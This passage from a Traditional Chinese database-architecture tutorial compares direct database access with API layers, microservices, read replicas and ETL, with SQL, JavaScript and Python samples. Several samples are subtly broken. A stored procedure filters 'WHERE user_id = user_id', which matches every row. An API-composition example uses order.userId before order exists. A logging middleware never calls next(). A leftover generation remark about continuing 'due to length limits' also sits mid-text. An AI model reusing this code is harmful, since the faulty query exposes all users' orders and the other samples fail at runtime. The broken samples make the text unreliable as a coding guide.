logger.debug(&#39;Discount calculated&#39;, &#123; discount &#125;); metrics.increment(&#39;orders.processed&#39;); return applyDiscount(order, discount); &#125; -- 預存程序 - 有限的可觀察性 -- 難以添加日誌 -- 難以添加指標 -- 難以追蹤執行 -- 難以在生產環境中除錯 6. 團隊技能： 大多數開發人員知道：JavaScript、Python、Java、Go 較少開發人員知道：PL&#x2F;SQL、T-SQL、PL&#x2F;pgSQL → 更難招聘 → 更難維護 → 知識孤島 何時預存程序有意義： ✅ 資料密集型操作： -- 批量資料處理 CREATE PROCEDURE archive_old_orders() BEGIN INSERT INTO orders_archive SELECT * FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); DELETE FROM orders WHERE created_at &lt; DATE_SUB(NOW(), INTERVAL 1 YEAR); END; ✅ 效能關鍵查詢： -- 複雜聚合在資料庫中更好 CREATE PROCEDURE get_sales_report(IN start_date DATE, IN end_date DATE) BEGIN SELECT DATE(created_at) as date, COUNT(*) as order_count, SUM(total) as revenue, AVG(total) as avg_order_value FROM orders WHERE created_at BETWEEN start_date AND end_date GROUP BY DATE(created_at); END; ✅ 遺留系統： 已經大量投資於預存程序 遷移成本太高 團隊在資料庫程式設計方面的專業知識 現代替代方案：精簡預存程序 -- 預存程序僅用於資料存取 CREATE PROCEDURE get_user_orders(IN user_id INT) BEGIN SELECT * FROM orders WHERE user_id &#x3D; user_id; END; &#x2F;&#x2F; 應用程式中的業務邏輯 class OrderService &#123; async calculateTotal(userId, orderId) &#123; const orders &#x3D; await db.call(&#39;get_user_orders&#39;, [userId]); const user &#x3D; await db.call(&#39;get_user&#39;, [userId]); &#x2F;&#x2F; 業務邏輯在這裡 - 可測試、可維護 const discount &#x3D; this.calculateDiscount(user, orders); return this.applyDiscount(orders, discount); &#125; &#125; 預存程序的結論： 預存程序可以集中邏輯，但它們： ❌ 不能解決直接存取問題 ❌ 創造新的維護挑戰 ❌ 限制技術選擇 ⚠️ 應謹慎用於資料密集型操作 ✅ 更好：將業務邏輯保留在應用程式層 4. 效能瓶頸 **問題：**資料庫變得不堪重負。 連接限制： PostgreSQL 預設：100 個連接 MySQL 預設：151 個連接 10 個應用程式 × 每個 20 個連接 &#x3D; 200 個連接 → 資料庫拒絕新連接 → 應用程式崩潰 查詢混亂： 應用程式 1：SELECT * FROM orders（全表掃描） 應用程式 2：跨 5 個表的複雜 JOIN 應用程式 3：未優化的查詢（缺少索引） → 資料庫 CPU 達到 100% → 所有應用程式變慢 5. 無存取控制 **問題：**應用程式擁有太多存取權限。 典型設置： -- 所有應用程式使用相同的使用者 GRANT ALL PRIVILEGES ON database.* TO &#39;app_user&#39;@&#39;%&#39;; 風險： 分析工具可以刪除資料 行動應用程式可以刪除表 無最小權限原則 意外資料遺失 6. 難以監控 **問題：**無法追蹤應用程式行為。 你無法回答的問題： 哪個應用程式導致慢查詢？ 哪個應用程式發出最多請求？ 哪個應用程式存取了敏感資料？ 哪個應用程式導致了中斷？ 企業解決方案：API 層 架構模式 在資料庫前放置 API 層有兩種主要模式： 模式 1：單體 API 層 flowchart TD subgraph Apps[\"應用程式\"] App1[\"📱 行動應用程式\"] App2[\"💻 Web 應用程式\"] App3[\"📊 分析\"] end subgraph API[\"API 層\"] Auth[\"🔐 身份驗證\"] BL[\"⚙️ 業務邏輯\"] Cache[\"💾 快取\"] RateLimit[\"🚦 速率限制\"] end Apps --> Auth Auth --> BL BL --> Cache Cache --> DB[(\"🗄️ 資料庫\")] style API fill:#e8f5e9 style DB fill:#e3f2fd 特徵： 單一 API 服務 一個資料庫（或共享資料庫） 集中式業務邏輯 簡單開始 模式 2：微服務（每服務一個資料庫） flowchart TD subgraph Apps[\"應用程式\"] App1[\"📱 行動應用程式\"] App2[\"💻 Web 應用程式\"] end subgraph Gateway[\"API 閘道\"] GW[\"🚪 閘道(路由)\"] end subgraph Services[\"微服務\"] UserSvc[\"👤 使用者服務\"] OrderSvc[\"📦 訂單服務\"] ProductSvc[\"🏷️ 產品服務\"] end subgraph Databases[\"資料庫\"] UserDB[(\"👤 使用者資料庫\")] OrderDB[(\"📦 訂單資料庫\")] ProductDB[(\"🏷️ 產品資料庫\")] end Apps --> GW GW --> UserSvc GW --> OrderSvc GW --> ProductSvc UserSvc --> UserDB OrderSvc --> OrderDB ProductSvc --> ProductDB style Gateway fill:#fff3e0 style Services fill:#e8f5e9 style Databases fill:#e3f2fd 特徵： 多個獨立服務 每個服務擁有自己的資料庫 分散式業務邏輯 複雜但可擴展 微服務模式：深入探討 核心原則：每服務一個資料庫 ❌ 反模式：共享資料庫 使用者服務 ──┐ ├──&gt; 共享資料庫 訂單服務 ───┘ 問題： - 透過架構緊密耦合 - 無法獨立部署 - 架構變更破壞多個服務 ✅ 模式：每服務一個資料庫 使用者服務 ──&gt; 使用者資料庫 訂單服務 ──&gt; 訂單資料庫 優勢： - 鬆散耦合 - 獨立部署 - 技術多樣性 由於篇幅限制，我將繼續創建文件的其餘部分。 範例實作： 使用者服務： &#x2F;&#x2F; user-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; 使用者服務擁有使用者資料庫 const userDB &#x3D; require(&#39;.&#x2F;db&#x2F;user-db&#39;); app.get(&#39;&#x2F;api&#x2F;users&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.findById(req.params.id); res.json(user); &#125;); app.post(&#39;&#x2F;api&#x2F;users&#39;, async (req, res) &#x3D;&gt; &#123; const user &#x3D; await userDB.create(req.body); res.json(user); &#125;); app.listen(3001); 訂單服務： &#x2F;&#x2F; order-service&#x2F;api.js const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); &#x2F;&#x2F; 訂單服務擁有訂單資料庫 const orderDB &#x3D; require(&#39;.&#x2F;db&#x2F;order-db&#39;); app.get(&#39;&#x2F;api&#x2F;orders&#x2F;:id&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.findById(req.params.id); &#x2F;&#x2F; 需要使用者資料？呼叫使用者服務 API const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service:3001&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); res.json(&#123; ...order, user: await user.json() &#125;); &#125;); app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; const order &#x3D; await orderDB.create(req.body); res.json(order); &#125;); app.listen(3002); API 閘道： &#x2F;&#x2F; api-gateway&#x2F;gateway.js const express &#x3D; require(&#39;express&#39;); const &#123; createProxyMiddleware &#125; &#x3D; require(&#39;http-proxy-middleware&#39;); const app &#x3D; express(); &#x2F;&#x2F; 路由到適當的服務 app.use(&#39;&#x2F;api&#x2F;users&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;user-service:3001&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;orders&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;order-service:3002&#39;, changeOrigin: true &#125;)); app.use(&#39;&#x2F;api&#x2F;products&#39;, createProxyMiddleware(&#123; target: &#39;http:&#x2F;&#x2F;product-service:3003&#39;, changeOrigin: true &#125;)); app.listen(8080); 微服務模式的優勢： 1. 獨立擴展： 使用者服務：2 個實例（低流量） 訂單服務：10 個實例（高流量） 產品服務：3 個實例（中等流量） 每個根據自己的需求擴展 2. 技術多樣性： &#x2F;&#x2F; 使用者服務 - Node.js + PostgreSQL const &#123; Pool &#125; &#x3D; require(&#39;pg&#39;); const pool &#x3D; new Pool(&#123; database: &#39;users&#39; &#125;); # 訂單服務 - Python + MongoDB from pymongo import MongoClient client &#x3D; MongoClient(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;) db &#x3D; client[&#39;orders&#39;] &#x2F;&#x2F; 產品服務 - Java + MySQL DataSource ds &#x3D; new MysqlDataSource(); ds.setURL(&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;products&quot;); 3. 獨立部署： 部署使用者服務 v2.0 → 只有使用者服務重啟 → 訂單服務繼續運行 → 產品服務繼續運行 → 無需協調部署 4. 故障隔離： 訂單服務崩潰 → 使用者仍可登入（使用者服務） → 使用者可瀏覽產品（產品服務） → 只有訂購功能中斷 → 部分系統可用性 微服務模式的挑戰： 1. 資料一致性： **問題：**無分散式交易 &#x2F;&#x2F; ❌ 無法跨服務執行此操作 BEGIN TRANSACTION; INSERT INTO users (id, name) VALUES (1, &#39;Alice&#39;); INSERT INTO orders (user_id, total) VALUES (1, 100); COMMIT; &#x2F;&#x2F; 使用者服務和訂單服務有獨立的資料庫 解決方案：Saga 模式 &#x2F;&#x2F; 基於編排的 saga class OrderService &#123; async createOrder(userId, items) &#123; &#x2F;&#x2F; 步驟 1：建立訂單 const order &#x3D; await orderDB.create(&#123; userId, items, status: &#39;pending&#39; &#125;); &#x2F;&#x2F; 步驟 2：發布事件 await eventBus.publish(&#39;OrderCreated&#39;, &#123; orderId: order.id, userId, items &#125;); return order; &#125; &#x2F;&#x2F; 監聽來自其他服務的事件 async onPaymentFailed(event) &#123; &#x2F;&#x2F; 補償交易 await orderDB.update(event.orderId, &#123; status: &#39;cancelled&#39; &#125;); &#125; &#125; class PaymentService &#123; async onOrderCreated(event) &#123; try &#123; await this.chargeCustomer(event.userId, event.total); await eventBus.publish(&#39;PaymentSucceeded&#39;, &#123; orderId: event.orderId &#125;); &#125; catch (error) &#123; await eventBus.publish(&#39;PaymentFailed&#39;, &#123; orderId: event.orderId &#125;); &#125; &#125; &#125; 2. 資料重複： **問題：**服務需要來自其他服務的資料 &#x2F;&#x2F; 訂單服務需要使用者電子郵件進行通知 &#x2F;&#x2F; 但使用者服務擁有使用者資料 &#x2F;&#x2F; ❌ 不好：每次訂單都查詢使用者服務 const order &#x3D; await orderDB.findById(orderId); const user &#x3D; await fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;); await sendEmail(user.email, order); &#x2F;&#x2F; 慢，創造耦合 &#x2F;&#x2F; ✅ 好：在訂單服務中快取使用者資料 const order &#x3D; await orderDB.findById(orderId); const userCache &#x3D; await orderDB.getUserCache(order.userId); await sendEmail(userCache.email, order); &#x2F;&#x2F; 快，但資料可能過時 解決方案：事件驅動的資料複製 &#x2F;&#x2F; 使用者服務發布事件 class UserService &#123; async updateUser(userId, data) &#123; await userDB.update(userId, data); &#x2F;&#x2F; 發布事件 await eventBus.publish(&#39;UserUpdated&#39;, &#123; userId, email: data.email, name: data.name &#125;); &#125; &#125; &#x2F;&#x2F; 訂單服務監聽並快取 class OrderService &#123; async onUserUpdated(event) &#123; &#x2F;&#x2F; 更新本地快取 await orderDB.updateUserCache(event.userId, &#123; email: event.email, name: event.name &#125;); &#125; &#125; 3. 分散式查詢： **問題：**無法跨服務 JOIN -- ❌ 無法使用微服務執行此操作 SELECT u.name, o.total, p.name as product_name FROM users u JOIN orders o ON u.id &#x3D; o.user_id JOIN products p ON o.product_id &#x3D; p.id; 解決方案：API 組合或 CQRS &#x2F;&#x2F; API 組合：在 API 閘道中聚合 app.get(&#39;&#x2F;api&#x2F;order-details&#x2F;:orderId&#39;, async (req, res) &#x3D;&gt; &#123; &#x2F;&#x2F; 呼叫多個服務 const [order, user, product] &#x3D; await Promise.all([ fetch(&#96;http:&#x2F;&#x2F;order-service&#x2F;api&#x2F;orders&#x2F;$&#123;req.params.orderId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;user-service&#x2F;api&#x2F;users&#x2F;$&#123;order.userId&#125;&#96;), fetch(&#96;http:&#x2F;&#x2F;product-service&#x2F;api&#x2F;products&#x2F;$&#123;order.productId&#125;&#96;) ]); &#x2F;&#x2F; 組合結果 res.json(&#123; order: await order.json(), user: await user.json(), product: await product.json() &#125;); &#125;); &#x2F;&#x2F; CQRS：獨立的讀取模型 class OrderReadModel &#123; &#x2F;&#x2F; 查詢的非正規化視圖 async getOrderDetails(orderId) &#123; &#x2F;&#x2F; 讀取資料庫中的預先連接資料 return await readDB.query(&#96; SELECT * FROM order_details_view WHERE order_id &#x3D; ? &#96;, [orderId]); &#125; &#x2F;&#x2F; 由所有服務的事件更新 async onOrderCreated(event) &#123; &#x2F;* 更新視圖 *&#x2F; &#125; async onUserUpdated(event) &#123; &#x2F;* 更新視圖 *&#x2F; &#125; async onProductUpdated(event) &#123; &#x2F;* 更新視圖 *&#x2F; &#125; &#125; 何時使用微服務模式： ✅ 大型組織： 多個團隊（5+ 團隊） 每個團隊擁有一個服務 獨立發布週期 ✅ 不同的擴展需求： 某些功能高流量 某些功能低流量 需要獨立擴展 ✅ 技術多樣性： 不同的語言/框架 不同的資料庫類型 遺留系統整合 ✅ 領域複雜性： 清晰的界限上下文 明確定義的服務邊界 成熟的領域理解 何時不使用微服務： ❌ 小團隊： &lt; 5 個開發人員 開銷太高 單體更簡單 ❌ 不清楚的邊界： 領域理解不足 服務經常變更 大量跨服務呼叫 ❌ 簡單應用程式： CRUD 操作 無複雜工作流程 單體就足夠 ❌ 新創公司/MVP： 需要快速行動 需求經常變更 過早優化 遷移路徑：單體到微服務 階段 1：帶模組的單體 單體 API ├── 使用者模組 ├── 訂單模組 └── 產品模組 ↓ 單一資料庫 階段 2：提取第一個服務 單體 API ──&gt; 共享資料庫 ↓ 使用者服務 ──&gt; 使用者資料庫（新） 階段 3：提取更多服務 產品服務 ──&gt; 產品資料庫 訂單服務 ──&gt; 訂單資料庫 使用者服務 ──&gt; 使用者資料庫 階段 4：淘汰單體 API 閘道 ├── 產品服務 ──&gt; 產品資料庫 ├── 訂單服務 ──&gt; 訂單資料庫 └── 使用者服務 ──&gt; 使用者資料庫 最佳實踐： 從單體開始 當痛點出現時提取服務 使用 API 閘道進行路由 實作服務發現 使用事件驅動通訊 監控一切 自動化部署 為故障設計 單體 API 層的優勢 1. 安全性 集中式身份驗證： 行動應用程式 → API（JWT 令牌） Web 應用程式 → API（OAuth） 分析 → API（API 金鑰） API → 資料庫（單一安全連接） 優勢： 應用程式中無資料庫憑證 撤銷每個應用程式的存取 稽核所有資料存取 實作速率限制 範例： &#x2F;&#x2F; 行動應用程式 - 無資料庫憑證 const response &#x3D; await fetch(&#39;https:&#x2F;&#x2F;api.example.com&#x2F;users&#39;, &#123; headers: &#123; &#39;Authorization&#39;: &#39;Bearer &#39; + token &#125; &#125;); 2. 鬆散耦合 架構獨立性： -- 資料庫變更 ALTER TABLE users RENAME COLUMN email TO email_address; API 保持不變： GET &#x2F;api&#x2F;users&#x2F;123 &#123; &quot;email&quot;: &quot;user@example.com&quot; &#x2F;&#x2F; API 契約不變 &#125; 結果： ✅ 行動應用程式運作 ✅ Web 應用程式運作 ✅ 分析運作 ✅ 只有 API 程式碼更新 3. 業務邏輯集中化 單一真相來源： &#x2F;&#x2F; API 層 - 折扣邏輯在一個地方 function calculateDiscount(user, order) &#123; if (user.isPremium) return order.total * 0.15; if (order.total &gt; 100) return order.total * 0.10; return 0; &#125; 優勢： 所有應用程式的一致行為 易於更新規則 單一測試位置 稽核軌跡 4. 效能優化 連接池： 10 個應用程式 → API（10 個連接） API → 資料庫（5 個池化連接） 而不是：10 個應用程式 × 20 &#x3D; 200 個連接 快取： &#x2F;&#x2F; 快取頻繁查詢 app.get(&#39;&#x2F;api&#x2F;products&#39;, async (req, res) &#x3D;&gt; &#123; const cached &#x3D; await redis.get(&#39;products&#39;); if (cached) return res.json(cached); const products &#x3D; await db.query(&#39;SELECT * FROM products&#39;); await redis.set(&#39;products&#39;, products, &#39;EX&#39;, 300); return res.json(products); &#125;); 優勢： 減少資料庫負載 更快的回應時間 更好的資源利用 5. 細粒度存取控制 每個應用程式的權限： &#x2F;&#x2F; 行動應用程式 - 唯讀 if (app &#x3D;&#x3D;&#x3D; &#39;mobile&#39;) &#123; allowedOperations &#x3D; [&#39;READ&#39;]; &#125; &#x2F;&#x2F; 管理工具 - 完整存取 if (app &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; user.isAdmin) &#123; allowedOperations &#x3D; [&#39;READ&#39;, &#39;WRITE&#39;, &#39;DELETE&#39;]; &#125; &#x2F;&#x2F; 分析 - 僅特定表 if (app &#x3D;&#x3D;&#x3D; &#39;analytics&#39;) &#123; allowedTables &#x3D; [&#39;orders&#39;, &#39;products&#39;]; &#125; 6. 全面監控 追蹤一切： &#x2F;&#x2F; 記錄所有 API 請求 app.use((req, res, next) &#x3D;&gt; &#123; logger.info(&#123; app: req.headers[&#39;x-app-name&#39;], user: req.user.id, endpoint: req.path, method: req.method, duration: Date.now() - req.startTime &#125;); &#125;); 洞察： 哪個應用程式最慢？ 哪些端點最常使用？ 哪個應用程式導致錯誤？ 每個應用程式的使用模式 混合方法：何時混合使用 唯讀直接存取 **情境：**分析和報表工具需要複雜查詢。 flowchart LR subgraph Write[\"寫入操作\"] App1[\"📱 行動應用程式\"] App2[\"💻 Web 應用程式\"] end subgraph Read[\"唯讀\"] Analytics[\"📊 分析\"] Reports[\"📈 報表\"] end Write --> API[\"🔐 API 層\"] API --> DB[(\"🗄️ 主資料庫\")] DB -.->|複製| ReadDB[(\"📖 讀取副本\")] Read --> ReadDB style API fill:#e8f5e9 style DB fill:#e3f2fd style ReadDB fill:#fff3e0 設置： -- 分析的唯讀使用者 CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;secure_password&#39;; GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; -- 連接到讀取副本 -- 對生產資料庫無影響 優勢： 分析不會拖慢生產環境 允許複雜查詢 無寫入存取風險 獨立監控 讀取副本 vs ETL：如何選擇？ 對於分析工作負載，你有兩個主要選項： 選項 1：讀取副本（即時） flowchart LR Prod[(\"🗄️ 生產資料庫\")] -.->|\"持續複製\"| Replica[(\"📖 讀取副本\")] Analytics[\"📊 分析工具\"] --> Replica style Prod fill:#e3f2fd style Replica fill:#fff3e0 -- 分析查詢在副本上執行 SELECT DATE(created_at) as date, COUNT(*) as orders, SUM(total) as revenue FROM orders WHERE created_at &gt;&#x3D; DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(created_at); 特徵： ⚡ 即時或近即時資料（秒級延遲） 🔄 持續複製 📊 與生產環境相同的架構 🎯 直接 SQL 查詢 ⚠️「近即時」現實檢查**讀取副本並非真正即時。**總是存在複製延遲。 典型複製延遲： **最佳情況：**100ms - 1 秒 **正常：**1-5 秒 **負載下：**10-60 秒 **網路問題：**數分鐘或更長 這意味著什麼： 12:00:00.000 - 客戶在生產環境下訂單 12:00:00.500 - 複製延遲（500ms） 12:00:00.500 - 訂單出現在讀取副本 12:00:00.600 - 分析儀表板查詢副本 結果：儀表板在訂單發生後 600ms 顯示 **真實世界情境：** -- 生產環境：剛建立訂單 INSERT INTO orders (id, status) VALUES (12345, &#39;pending&#39;); -- 讀取副本：2 秒後 SELECT * FROM orders WHERE id &#x3D; 12345; -- 返回：無結果（複製延遲） -- 副本上 2 秒後 SELECT * FROM orders WHERE id &#x3D; 12345; -- 返回：找到訂單 **複製延遲何時造成問題：** 1. **客戶看到過時資料：** 使用者：「我剛下了訂單！」 儀表板：「找不到訂單」 使用者：「你的系統壞了！」 2. **不一致的視圖：** 行動應用程式（生產）：100 個訂單 儀表板（副本）：98 個訂單（落後 2 秒） 3. **基於舊資料的業務決策：** 經理：「我們只有 5 件庫存」 現實：0 件（最後 3 秒賣出 5 件） 經理：「來做促銷！」 結果：超賣 **監控複製延遲：** -- PostgreSQL SELECT client_addr, state, sync_state, replay_lag, write_lag, flush_lag FROM pg_stat_replication; -- MySQL SHOW SLAVE STATUS\\G -- 查看：Seconds_Behind_Master **高延遲警報：** # Prometheus 警報 - alert: HighReplicationLag expr: mysql_slave_lag_seconds &gt; 10 for: 2m annotations: summary: &quot;複製延遲為 &#123;&#123; $value &#125;&#125; 秒&quot; **儘管有延遲仍可接受的使用案例：** - ✅ 歷史報表（昨天的銷售） - ✅ 趨勢分析（最近 30 天） - ✅ 帶有「資料截至 X 秒前」免責聲明的儀表板 - ✅ 非關鍵指標 **不可接受的使用案例：** - ❌ 即時庫存檢查 - ❌ 詐欺檢測 - ❌ 面向客戶的「你的訂單」頁面 - ❌ 關鍵業務決策 **如果你需要真正的即時：** - 直接查詢生產資料庫（謹慎） - 使用變更資料捕獲（CDC）與串流 - 實作事件驅動架構 - 接受延遲並圍繞它設計 選項 2：ETL 到資料倉儲（批次） flowchart LR Prod[(\"🗄️ 生產資料庫\")] -->|\"夜間提取\"| ETL[\"⚙️ ETL 流程\"] ETL -->|\"轉換& 載入\"| DW[(\"📊 資料倉儲\")] Analytics[\"📊 分析工具\"] --> DW style Prod fill:#e3f2fd style ETL fill:#fff3e0 style DW fill:#e8f5e9 # ETL 作業每晚執行 def etl_orders(): # 從生產環境提取 orders &#x3D; prod_db.query(&quot;&quot;&quot; SELECT * FROM orders WHERE updated_at &gt;&#x3D; CURRENT_DATE - INTERVAL &#39;1 day&#39; &quot;&quot;&quot;) # 轉換 for order in orders: order[&#39;revenue&#39;] &#x3D; order[&#39;total&#39;] - order[&#39;discount&#39;] order[&#39;profit_margin&#39;] &#x3D; calculate_margin(order) # 載入到倉儲 warehouse.bulk_insert(&#39;fact_orders&#39;, orders) 特徵： 🕐 排程更新（每小時/每天） 🔄 批次處理 🏗️ 轉換的架構（為分析優化） 📈 預先聚合的資料 📅 批次處理：可預測的過時性ETL 資料是故意過時的——這沒關係。 典型 ETL 排程： **每小時：**資料是 0-60 分鐘舊 **每天：**資料是 0-24 小時舊 **每週：**資料是 0-7 天舊 範例時間軸： 週一 9:00 AM - 客戶下訂單 週一 11:59 PM - ETL 作業開始 週二 12:30 AM - ETL 作業完成 週二 8:00 AM - 分析師查看報表 資料年齡：約 23 小時舊 **為什麼批次對分析更好：** 1. **一致的快照：** # ETL 捕獲時間點快照 # 所有資料來自同一時刻 snapshot_time &#x3D; &#39;2024-01-15 23:59:59&#39; orders &#x3D; extract_orders(snapshot_time) customers &#x3D; extract_customers(snapshot_time) products &#x3D; extract_products(snapshot_time) # 所有資料都是一致的 # 無查詢中途變更 2. **無查詢中途更新：** 讀取副本（即時）： 開始查詢：100 個訂單 查詢中途：5 個新訂單到達 結束查詢：不一致的結果 資料倉儲（批次）： 開始查詢：100 個訂單 查詢中途：無變更（靜態快照） 結束查詢：一致的結果 3. **為聚合優化：** -- 倉儲中預先聚合 SELECT date, SUM(revenue) FROM daily_sales_summary -- 已經求和 WHERE date &gt;&#x3D; &#39;2024-01-01&#39;; -- 10ms 返回 -- vs 讀取副本 SELECT DATE(created_at), SUM(total) FROM orders -- 必須掃描數百萬行 WHERE created_at &gt;&#x3D; &#39;2024-01-01&#39; GROUP BY DATE(created_at); -- 30 秒返回 **過時性可接受的情況：** - ✅ 月度/季度報表 - ✅ 年度比較 - ✅ 趨勢分析 - ✅ 高階主管儀表板 - ✅ 合規報表 **過時性不可接受的情況：** - ❌ 即時操作儀表板 - ❌ 即時警報 - ❌ 面向客戶的資料 - ❌ 詐欺檢測 **混合解決方案：Lambda 架構** 即時層（讀取副本）： - 最近 24 小時的資料 - 對最近資料的快速查詢 - 可接受延遲：秒 批次層（資料倉儲）： - 歷史資料（&gt;24 小時） - 複雜分析 - 可接受延遲：小時&#x2F;天 服務層： - 合併兩個視圖 - 最近 + 歷史 **範例實作：** def get_sales_report(start_date, end_date): today &#x3D; datetime.now().date() # 從倉儲獲取歷史資料 if end_date &lt; today: return warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, end_date ) # 從副本獲取最近資料 historical &#x3D; warehouse.query( &quot;SELECT * FROM sales_summary WHERE date BETWEEN ? AND ?&quot;, start_date, today - timedelta(days&#x3D;1) ) recent &#x3D; replica.query( &quot;SELECT * FROM orders WHERE date &gt;&#x3D; ?&quot;, today ) return merge(historical, recent) 比較： 因素 讀取副本 ETL 到資料倉儲 資料新鮮度 即時（秒） 批次（小時/天） 查詢效能 取決於生產架構 為分析優化 架構 與生產相同 轉換（星型/雪花型） 對生產的影響 最小（獨立伺服器） 最小（排程離峰） 複雜度 低 高 成本 較低 較高 資料轉換 無 廣泛 歷史資料 受保留限制 無限 多個來源 單一資料庫 多個資料庫/API 何時使用讀取副本： ✅ 即時儀表板： &#x2F;&#x2F; 即時訂單監控 SELECT COUNT(*) as active_orders FROM orders WHERE status &#x3D; &#39;processing&#39; AND created_at &gt;&#x3D; NOW() - INTERVAL 1 HOUR; ✅ 操作報表： 當前庫存水平 活躍使用者會話 今天的銷售數字 系統健康指標 ✅ 簡單分析： 單一資料來源 無複雜轉換 生產架構運作良好 ✅ 預算限制： 小團隊 有限資源 需要快速設置 何時使用 ETL/資料倉儲： ✅ 複雜分析： -- 多維分析 SELECT d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region, SUM(f.revenue) as total_revenue, SUM(f.profit) as total_profit FROM fact_sales f JOIN dim_date d ON f.date_key &#x3D; d.date_key JOIN dim_product p ON f.product_key &#x3D; p.product_key JOIN dim_customer c ON f.customer_key &#x3D; c.customer_key GROUP BY d.year, d.quarter, d.month, p.category, p.brand, c.country, c.region; ✅ 多個資料來源： # 組合來自多個系統的資料 def build_customer_360(): # 從生產資料庫 orders &#x3D; extract_from_postgres() # 從 CRM API interactions &#x3D; extract_from_salesforce() # 從支援系統 tickets &#x3D; extract_from_zendesk() # 組合並載入 customer_360 &#x3D; merge_data(orders, interactions, tickets) warehouse.load(&#39;customer_360&#39;, customer_360) ✅ 歷史分析： 長期趨勢（數年資料） 年度比較 季節性模式 留存群組 ✅ 資料轉換需求： 為效能進行非正規化 業務邏輯計算 資料品質修正 聚合和彙總 ✅ 合規/稽核： 不可變的歷史記錄 時間點快照 稽核軌跡 監管報告 混合方法： 許多企業同時使用兩者： 即時需求 → 讀取副本 - 即時儀表板 - 操作報表 - 當前指標 分析需求 → 資料倉儲 - 歷史分析 - 複雜查詢 - 多來源報表 範例架構： flowchart TD Prod[(\"🗄️ 生產資料庫\")] Prod -.->|\"即時複製\"| Replica[(\"📖 讀取副本\")] Prod -->|\"夜間ETL\"| DW[(\"📊 資料倉儲\")] Replica --> LiveDash[\"⚡ 即時儀表板\"] DW --> Analytics[\"📈 分析平台\"] DW --> BI[\"📊 BI 工具\"] style Prod fill:#e3f2fd style Replica fill:#fff3e0 style DW fill:#e8f5e9 遷移路徑： 階段 1：從讀取副本開始 生產資料庫 → 讀取副本 → 分析 - 快速設置 - 立即價值 - 低複雜度 階段 2：隨著需求增長添加 ETL 生產資料庫 → 讀取副本 → 即時儀表板 ↓ ETL → 資料倉儲 → 複雜分析 - 保留即時用於操作需求 - 添加倉儲用於分析需求 - 兩全其美 成本比較： 讀取副本： 資料庫副本：$200&#x2F;月 設置時間：1 天 維護：低 第一年總計：約 $2,400 資料倉儲 + ETL： 倉儲：$500&#x2F;月 ETL 工具：$300&#x2F;月 設置時間：2-4 週 維護：中高 第一年總計：約 $9,600 + 設置成本 決策框架： 從讀取副本開始，如果： - 需要即時資料 - 單一資料來源 - 簡單查詢 - 小預算 - 需要快速成功 遷移到資料倉儲，當： - 需要歷史分析（&gt;1 年） - 多個資料來源 - 複雜轉換 - 副本上的慢查詢 - 合規要求 架構抽象的資料庫視圖 **情境：**需要直接存取但想隱藏架構複雜性。 -- 建立簡化視圖 CREATE VIEW customer_summary AS SELECT c.id, c.name, c.email_address AS email, -- 隱藏欄位重新命名 COUNT(o.id) AS order_count, SUM(o.total) AS total_spent FROM customers c LEFT JOIN orders o ON c.id &#x3D; o.customer_id GROUP BY c.id; -- 僅授予視圖存取權限 GRANT SELECT ON customer_summary TO &#39;reporting_app&#39;@&#39;%&#39;; 優勢： 隱藏架構變更 簡化的資料模型 預先連接的資料 存取控制 決策框架 選擇直接存取的情況： ✅ 小規模： &lt; 5 個應用程式 &lt; 1000 個使用者 低流量 ✅ 僅內部： 無外部存取 可信任環境 單一團隊 ✅ 唯讀： 分析工具 報表儀表板 資料科學 ✅ 原型製作： MVP 階段 概念驗證 時間緊迫的展示 選擇 API 層的情況： ✅ 企業規模： 5+ 個應用程式 1000+ 個使用者 高流量 ✅ 外部存取： 行動應用程式 第三方整合 公共 API ✅ 安全關鍵： 客戶資料 財務資訊 醫療記錄 ✅ 長期產品： 生產系統 多個團隊 頻繁變更 最佳實踐 如果你必須使用直接存取 1. 使用讀取副本： 寫入應用程式 → API → 主資料庫 讀取應用程式 → 讀取副本 2. 為每個應用程式建立資料庫使用者： CREATE USER &#39;mobile_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password1&#39;; CREATE USER &#39;web_app&#39;@&#39;%&#39; IDENTIFIED BY &#39;password2&#39;; CREATE USER &#39;analytics&#39;@&#39;%&#39; IDENTIFIED BY &#39;password3&#39;; 3. 授予最小權限： -- 行動應用程式 - 只需要使用者和訂單 GRANT SELECT ON database.users TO &#39;mobile_app&#39;@&#39;%&#39;; GRANT SELECT ON database.orders TO &#39;mobile_app&#39;@&#39;%&#39;; -- 分析 - 所有內容唯讀 GRANT SELECT ON database.* TO &#39;analytics&#39;@&#39;%&#39;; 4. 使用連接池： &#x2F;&#x2F; 限制每個應用程式的連接 const pool &#x3D; mysql.createPool(&#123; host: &#39;database.example.com&#39;, user: &#39;mobile_app&#39;, password: process.env.DB_PASSWORD, database: &#39;production&#39;, connectionLimit: 5 &#x2F;&#x2F; 每個應用程式的限制 &#125;); 5. 監控一切： -- 啟用查詢日誌 SET GLOBAL general_log &#x3D; &#39;ON&#39;; SET GLOBAL log_output &#x3D; &#39;TABLE&#39;; -- 檢視慢查詢 SELECT * FROM mysql.slow_log WHERE user_host LIKE &#39;%mobile_app%&#39;; 結論 